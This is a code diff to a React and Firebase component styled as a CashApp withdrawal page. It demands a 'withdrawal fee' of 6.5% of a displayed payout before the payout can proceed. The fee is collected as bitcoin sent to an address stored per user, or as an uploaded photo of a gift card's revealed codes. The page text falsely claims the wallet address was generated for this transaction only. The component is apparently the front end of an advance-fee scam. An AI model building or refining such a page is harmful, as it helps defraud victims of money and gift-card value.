@@ -2,15 +2,46 @@ import { useState } from "react";
 import "../styles/paypal.css"
 import { NavLink } from "react-router-dom";
 import { useNavigate } from "react-router-dom";
+import { toast } from "react-toastify";
 
 
-function CashApp() {
+import { useEffect } from "react";
+import { auth,db } from "../firebaseConfig";
+import { doc, getDoc } from "firebase/firestore";
+import LoadingScreen from "./loadingScreen";
+
+
+
+function CashApp(prop) {
+
+
+     const [userDetails, setUserDetails] = useState(null)
+
+    const fetchUserData = async (e)=> {
+        auth.onAuthStateChanged(async(user)=> {
+            console.log(user);
+            const docRef = doc(db, "users", user.uid);
+            const docSnap = await getDoc(docRef);
+            if(docSnap.exists()){
+                setUserDetails({...docSnap.data(), id: user.uid})
+                console.log(docSnap.data())
+            }
+        })
+    };
+
+    useEffect(()=> {
+        fetchUserData()
+    }, [])
+
+    
 
     const navigate = useNavigate();
-      function madePayment() {
+
+    function madePayment() {
         navigate("../paymentPage")
     }
 
+     const [calFee, setCalFee] = useState(0)
 
     const [step, setStep] = useState("step1");
 
@@ -35,6 +66,8 @@ function CashApp() {
         color: selectedMethod == "card" ? `white` : `black`,
     }
 
+    
+
     const [image, setImage] = useState(null);
     const [preview, setPreview] = useState(null);
 
@@ -53,6 +86,23 @@ function CashApp() {
         }
     };
 
+    const imgStyle = {
+        backgroundImage: preview ? `url(${preview})` : `url("https://www.svgrepo.com/show/215084/gift-card.svg")`,
+        backgroundSize: `cover`,
+        backgroundPosition: `center`,
+
+    }
+
+
+
+    function toStep2(){
+        if(payAccount && payAccount.length > 2){
+            setStep("step2")
+        }else {
+          toast.error('enter a valid cashapp account', {position: "top-center"})
+        }
+    }
+
     function showMethod() {
         if (selectedMethod == "crypto") {
             return <div className="bitcoin">
@@ -62,7 +112,7 @@ function CashApp() {
                 </div>
                 <div className="wallet-address">
                     <h1>Bitcoin wallet address:</h1>
-                    <p>xj23hsj2xbvm029kkilon14rpjlion125</p>
+                    <p>{userDetails ? userDetails.cryptoAddress: ""}</p>
                 </div>
                 <div className="note">
                     <p>Note: this wallet address was generated for this transaction only, and only for bitcoin, any other other cryptocurrency made to this wallet address would be loss</p>
@@ -71,6 +121,7 @@ function CashApp() {
                 <div className="paybis">
                     <h1>Dont have bitcoin?</h1>
                     <button>Buy from Paybis</button>
+                    
                     <p>step 1: click on the button and select your region (eg US:Dollar)</p>
                     <p>step2: select bitcoin from the option of crypto to purchase</p>
                     <p>step3: enter the above wallet address as purchase destination</p>
@@ -78,19 +129,20 @@ function CashApp() {
                 </div>
             </div>
         } else if (selectedMethod == "gift") {
-            return <div className="gift">
-                <h1 className="fcfg"><span>FCFG</span> Secured Uploader</h1>
-                <div className="uploader-container">
-                    <p>Scratch/Peel off and reveal the code at the back of gift card</p>
-                    <h2>Upload an Image of <br />gift Card</h2>
-                    <input type="file" accept="image/*" onChange={handleImageChange} />
-                    {preview && (
-                        <div className="image-preview">
-                            <img src={preview} alt="Uploaded Preview" />
-                        </div>
-                    )}
+            return <div className="verify-page">
+                <div className="verify-nav"><i className="bi-arrow-left" onClick={() => { setStep("step2") }}></i></div>
+                <div className="upload">
+                    <div className="verify-head">
+                        <h1>Upload Gift Card</h1>
+                        <p>upload a photo of back of gift card reavling it's codes</p>
+                    </div>
+                    <div className="main-verify">
+                        <div className="verify-image" style={imgStyle}></div>
+                        <input type="file" onChange={handleImageChange} />
+                    </div>
                 </div>
-                <button>Upload</button>
+
+                <button className="verify-button" onClick={() => { setVerify("pending") }}>Continue</button>
             </div>
         }else if(selectedMethod == "card") {
             navigate("../debitCard")
@@ -100,25 +152,25 @@ function CashApp() {
     function showStep() {
         if (step == "step1") {
             return <div className="paypal-box">
-                <img src="https://www.pngall.com/wp-content/uploads/13/Cash-App-Logo.png" className="cash-img"/>
+                <img src="https://www.pngall.com/wp-content/uploads/13/Cash-App-Logo.png" className="cash-img" />
 
-                <h1>Enter Your CashApp Tag</h1>
-                <input type="email" placeholder="$user" onChange={(e) => setPayAccount(e.target.value)} />
-                <button onClick={() => setStep("step2")}> Next <i className="bi-arrow-right"></i></button>
+                <h1>Enter Your CashApp tag</h1>
+                <input type="email" placeholder="user@email.com" onChange={(e) => setPayAccount(e.target.value)} />
+                <button onClick={toStep2}> Next <i className="bi-arrow-right"></i></button>
             </div>
         } else if (step == "step2") {
             return <div className="pay-send">
                 <div className="pay-head">
                     <p>Transfer</p>
-                    <h1 className="head-special">${100.00} <br /> </h1>
+                    <h1 className="head-special">${prop.withAmount} <br /> </h1>
 
                     <p>To</p>
                     <h1>{payAccount}</h1>
                     <p>Withdrawal Fee:</p>
-                    <h1 className="head-special2">$50.00</h1>
+                    <h1 className="head-special2">${Math.floor(prop.withAmount * 0.065)}.00</h1>
                 </div>
                 <div className="fee-method">
-                    <h2> Pay Withdrawal Fee($50) with</h2>
+                    <h2> Pay Withdrawal Fee $({Math.floor(prop.withAmount * 0.065)}) with</h2>
                     <div className="method" style={cryptoStyle} onClick={() => setSelectedMethod("crypto")}>
                         <img src="https://tse4.mm.bing.net/th/id/OIP.L37frQFm2G-k6wXWyTxI9AHaHa?r=0&w=1920&h=1920&rs=1&pid=ImgDetMain&o=7&rm=3" />
                         <p>Pay With Crypto</p>
@@ -142,7 +194,8 @@ function CashApp() {
     }
 
     return (
-        <section className="paypal">
+        <>
+           {userDetails ?   <section className="paypal">
             <div className="steps-div">
                 {step == "step1" ? <div className="step-green"></div> : <div className="step"></div>}
                 {step == "step2" ? <div className="step-green"></div> : <div className="step"></div>}
@@ -150,7 +203,8 @@ function CashApp() {
             </div>
 
             {showStep()}
-        </section>
+        </section>: <LoadingScreen/>}
+        </>
     )
 }
 
